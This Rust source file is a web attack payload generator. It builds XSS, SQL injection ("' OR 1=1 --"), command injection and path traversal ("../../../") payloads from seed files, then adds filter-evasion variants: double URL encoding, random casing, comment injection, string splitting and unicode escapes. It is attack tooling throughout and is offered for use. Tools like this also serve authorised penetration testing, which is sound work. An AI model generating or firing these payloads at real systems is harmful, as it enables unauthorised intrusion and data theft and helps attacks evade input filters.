use std::fs;
use std::io::{self, BufWriter, Write, BufRead};
use std::path::Path;
use rand::seq::SliceRandom;
use rand::thread_rng;
use hex;
use base64;
use urlencoding;

pub enum AttackType {
    XSS,
    SQLInjection,
    CommandInjection,
    PathTraversal,
}

impl AttackType {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "xss" => Some(AttackType::XSS),
            "sqlinjection" => Some(AttackType::SQLInjection),
            "commandinjection" => Some(AttackType::CommandInjection),
            "pathtraversal" => Some(AttackType::PathTraversal),
            _ => None,
        }
    }

    pub fn generate(&self, count: usize, save_to_file: bool) -> Vec<String> {
        let mut rng = thread_rng();
        let mut payloads = Vec::new();
        let dir = "generated_payloads";

        if save_to_file {
            fs::create_dir_all(dir).expect("Failed to create directory");
        }

        for i in 0..count {
            let payload = self.create_payload("payloads", &mut rng);
            let hex_payload = hex::encode(&payload.as_bytes());
            let base64_payload = base64::encode(&payload);
            let formatted_payload = format!(
                "Payload {}:\nHex: {}\nBase64: {}\nRaw: {}\n",
                i + 1, hex_payload, base64_payload, payload
            );
            payloads.push(formatted_payload.clone());

            if save_to_file {
                self.save_payload_to_file(&formatted_payload, dir, i);
            }
        }
        payloads
    }

    fn create_payload(&self, dir: &str, rng: &mut impl rand::Rng) -> String {
        let payload_data = self.load_payloads(dir);

        match self {
            AttackType::XSS => self.generate_xss_payload(&payload_data, rng),
            AttackType::SQLInjection => self.generate_sql_payload(&payload_data, rng),
            AttackType::CommandInjection => self.generate_command_payload(&payload_data, rng),
            AttackType::PathTraversal => self.generate_path_payload(&payload_data, rng),
        }
    }

    fn generate_xss_payload(&self, payload_data: &[String], rng: &mut impl rand::Rng) -> String {
        let payload_content = self.select_payload_content(&payload_data, rng);
        let mut xss_payload = format!("<script>alert('{}');</script>", payload_content);
        xss_payload = self.obfuscate_xss(&xss_payload);
        xss_payload = self.apply_advanced_techniques(&xss_payload);
        xss_payload
    }

    fn generate_sql_payload(&self, payload_data: &[String], rng: &mut impl rand::Rng) -> String {
        let payload_content = self.select_payload_content(&payload_data, rng);
        let sql_payload = format!("' OR 1=1 -- {}", payload_content);
        self.apply_advanced_techniques(&sql_payload)
    }

    fn generate_command_payload(&self, payload_data: &[String], rng: &mut impl rand::Rng) -> String {
        let payload_content = self.select_payload_content(&payload_data, rng);
        let command_payload = format!("; {}", payload_content);
        self.apply_advanced_techniques(&command_payload)
    }

    fn generate_path_payload(&self, payload_data: &[String], rng: &mut impl rand::Rng) -> String {
        let payload_content = self.select_payload_content(&payload_data, rng);
        let path_payload = format!("../../../{}", payload_content);
        self.apply_advanced_techniques(&path_payload)
    }

    fn obfuscate_xss(&self, payload: &str) -> String {
        payload.replace("<", "%3C").replace(">", "%3E")
    }

    fn apply_advanced_techniques(&self, payload: &str) -> String {
        let url_encoded = urlencoding::encode(payload);
        let double_encoded = urlencoding::encode(&url_encoded);
        let case_varied = self.random_case_variation(payload);
        let comment_injected = self.inject_comments(payload);
        let concatenated = self.split_and_concatenate(payload);
        let unicode_encoded = self.unicode_encode(payload);

        format!(
            "{}\nURL Encoded: {}\nDouble URL Encoded: {}\nCase Varied: {}\nComment Injected: {}\nConcatenated: {}\nUnicode Encoded: {}",
            payload, url_encoded, double_encoded, case_varied, comment_injected, concatenated, unicode_encoded
        )
    }

    fn random_case_variation(&self, payload: &str) -> String {
        payload.chars().map(|c| {
            if rand::random() { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() }
        }).collect()
    }

    fn inject_comments(&self, payload: &str) -> String {
        payload.replace(" ", "/**/")
    }

    fn split_and_concatenate(&self, payload: &str) -> String {
        payload.chars().map(|c| format!("'{}'+", c)).collect::<String>() + "''"
    }

    fn unicode_encode(&self, payload: &str) -> String {
        payload.chars().map(|c| format!("\\u{:04x}", c as u32)).collect()
    }

    fn select_payload_content(&self, payload_data: &[String], rng: &mut impl rand::Rng) -> String {
        let chosen_payload = payload_data.choose(rng).unwrap().to_string();
        chosen_payload
    }

    fn load_payloads(&self, dir: &str) -> Vec<String> {
        let file_path = match self {
            AttackType::XSS => format!("{}/xss.txt", dir),
            AttackType::SQLInjection => format!("{}/sqlinjection.txt", dir),
            AttackType::CommandInjection => format!("{}/commandinjection.txt", dir),
            AttackType::PathTraversal => format!("{}/pathtraversal.txt", dir),
        };

        println!("Loading payloads from: {}", file_path);
        if let Ok(lines) = read_lines(&file_path) {
            lines.filter_map(Result::ok).collect()
        } else {
            println!("Failed to read lines from: {}", file_path);
            vec!["Default Payload".to_string()]
        }
    }

    fn save_payload_to_file(&self, payload: &str, dir: &str, index: usize) {
        let file_path = format!("{}/payload_{}.txt", dir, index);
        let file = fs::File::create(file_path).expect("Failed to create file");
        let mut writer = BufWriter::new(file);
        writeln!(writer, "{}", payload).expect("Failed to write to file");
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<fs::File>>>
where
    P: AsRef<Path>,
{
    let file = fs::File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
